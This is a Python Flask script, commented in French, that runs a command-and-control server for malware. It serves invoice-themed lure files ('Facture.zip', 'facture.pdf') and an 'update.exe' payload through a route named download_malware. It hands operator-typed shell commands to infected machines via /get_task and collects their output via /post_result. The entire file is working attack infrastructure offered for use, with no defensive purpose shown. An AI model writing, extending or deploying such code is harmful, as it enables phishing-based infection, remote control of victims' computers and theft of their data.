import logging
import threading
import time
import os
from flask import Flask, request, send_from_directory

# 1. Configuration pour faire taire les logs Flask (le bruit de fond)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR) # Affiche seulement les erreurs graves

app = Flask(__name__)

# Variable globale pour stocker la commande à envoyer
# "IDLE" signifie "Rien à faire, dors"
command_to_send = "IDLE"

@app.route('/Facture.zip', methods=['GET'])
def download_zip():
    # Sert le fichier ZIP situé dans le dossier courant
    try:
        return send_from_directory(os.getcwd(), 'Facture.zip', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404

@app.route('/update.exe', methods=['GET'])
def download_malware():
    # Envoie le fichier update.exe situé dans le dossier courant
    try:
        return send_from_directory(os.getcwd(), 'update.exe', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404

@app.route('/facture.pdf', methods=['GET'])
def download_pdf():
    # Envoie le fichier Facture.pdf (Attention aux majuscules/minuscules !)
    # Si ton fichier sur le disque s'appelle "Facture.pdf", assure-toi que le nom ici correspond
    try:
        return send_from_directory(os.getcwd(), 'Facture.pdf', as_attachment=True)
    except FileNotFoundError:
        return "File not found", 404
    
@app.route('/get_task', methods=['GET'])
def get_task():
    global command_to_send
    
    # Si on a une commande en attente (autre que IDLE)
    if command_to_send != "IDLE":
        task = command_to_send
        # IMPORTANT : Une fois envoyée, on remet à IDLE pour ne pas l'exécuter 2 fois
        command_to_send = "IDLE" 
        return task
    
    return "" # Renvoie vide si rien à faire

@app.route('/post_result', methods=['POST'])
def post_result():
    # On reçoit le résultat du virus
    result = request.data.decode('utf-8', errors='ignore')
    
    if result:
        print(f"\n{'-'*30}\n{result}\n{'-'*30}")
        # On réaffiche le prompt pour que l'interface reste propre
        print("C2 > ", end="", flush=True)
        
    return "OK"

# Fonction qui gère ton clavier (Interface Homme-Machine)
def console_input():
    global command_to_send
    
    # Petit temps d'attente pour laisser le serveur démarrer proprement
    time.sleep(1)
    
    print("\n[*] Serveur C2 Démarré. En attente de connexion...")
    print("[*] Tapez vos commandes ci-dessous (ex: whoami, ipconfig, dir)\n")

    while True:
        # Le prompt (comme un vrai shell)
        user_input = input("C2 > ")
        
        # Si l'utilisateur tape quelque chose, on le met en file d'attente
        if user_input.strip() != "":
            command_to_send = user_input
            # On n'affiche rien ici, on attend que le résultat revienne

def run_server():
    # Lancement du serveur (port 80 ou 8000 selon tes droits)
    # Si tu es root : port=80
    # Si tu es user : port=8000
    app.run(host='0.0.0.0', port=8000)

if __name__ == '__main__':
    # Vérification que les fichiers sont bien là avant de lancer
    if not os.path.exists("update.exe"):
        print("[!] ATTENTION : 'update.exe' est introuvable dans ce dossier !")
    if not os.path.exists("Facture.pdf"):
        print("[!] ATTENTION : 'Facture.pdf' est introuvable dans ce dossier !")
    # On lance l'interface clavier dans un processus parallèle (Thread)
    t = threading.Thread(target=console_input)
    t.daemon = True # Le thread mourra quand on fermera le script
    t.start()
    
    # On lance le serveur web
    run_server()